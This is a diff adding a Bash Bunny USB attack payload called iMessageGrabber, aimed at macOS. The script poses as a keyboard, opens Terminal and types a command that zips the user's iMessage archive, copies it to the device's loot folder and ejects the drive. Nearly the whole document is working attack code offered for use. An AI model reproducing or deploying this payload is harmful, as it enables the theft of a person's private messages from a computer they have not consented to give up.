@@ -1,0 +1,35 @@
+# Title:         iMessageGrabber
+# Description:   Exfiltrates the iMessage archive of the current user
+# Author:        GermanNoob
+# Props:         wiredBrother
+# Version:       1.0
+# Category:      Exfiltration
+# Target:        MacOS (iMessage)
+# Attackmodes:   HID, STORAGE
+
+# options - Define the name of the BashBunny volume
+bashbunnyvolume=BASHBUNNY
+
+LED SETUP
+mkdir /root/udisk/loot/iMessage
+lootdir=/Volumes/$bashbunnyvolume/loot/iMessage/
+
+#### INITIAL STAGE #####
+
+ATTACKMODE HID STORAGE
+LED ATTACK
+RUN OSX terminal
+Q WAIT 500
+Q STRING 'zip -r messages.zip Library/Messages/Archive/*;mv messages.zip '$lootdir';touch '$lootdir'finished;diskutil eject /Volumes/BASHBUNNY;exit'
+Q ENTER
+
+##### WAITING FOR ATTACK TO END ########
+
+LED STAGE2
+while [ ! -f /root/udisk/loot/iMessage/finished ]
+do
+	sleep 1
+	sync
+done
+
+LED FINISH
